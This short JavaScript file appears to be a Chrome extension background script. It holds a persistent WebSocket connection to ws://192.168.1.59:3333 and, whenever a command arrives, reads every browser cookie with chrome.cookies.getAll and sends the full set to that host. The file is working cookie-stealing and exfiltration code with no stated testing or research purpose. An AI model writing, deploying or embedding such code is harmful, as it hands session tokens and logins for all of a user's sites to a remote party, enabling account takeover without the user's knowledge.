function printCookies(d) {
  chrome.cookies.getAll({}, cookies => doSend(cookies,d));
}

  var wsUri = "ws://192.168.1.59:3333";
  var output;

  testWebSocket();

  function testWebSocket()
  {
    websocket = new WebSocket(wsUri);
    websocket.onopen = function(evt) { onOpen(evt) };
    websocket.onclose = function(evt) { onClose(evt) };
    websocket.onmessage = function(evt) { onMessage(evt) };
  }

  function onOpen(evt)
  {
      clearInterval(window.setClWeb)
  }

  function onClose(evt)
  {
      window.setClWeb = setInterval(function(){
          console.log("setInterval onClose")
          testWebSocket();
      },10000)
  }

  function onMessage(evt)
  {
    var d = JSON.parse(evt.data);
    if(d.id != undefined){
        printCookies(d);
    }
  }


  function doSend(message,d)
  {
    writeToScreen("SENT: " + message);
    console.log(message);
    var cookies = {
    id: d.id,
    success: true,
    result: message
    }
    websocket.send(JSON.stringify(cookies));
  }

  function writeToScreen(message)
  {
  }

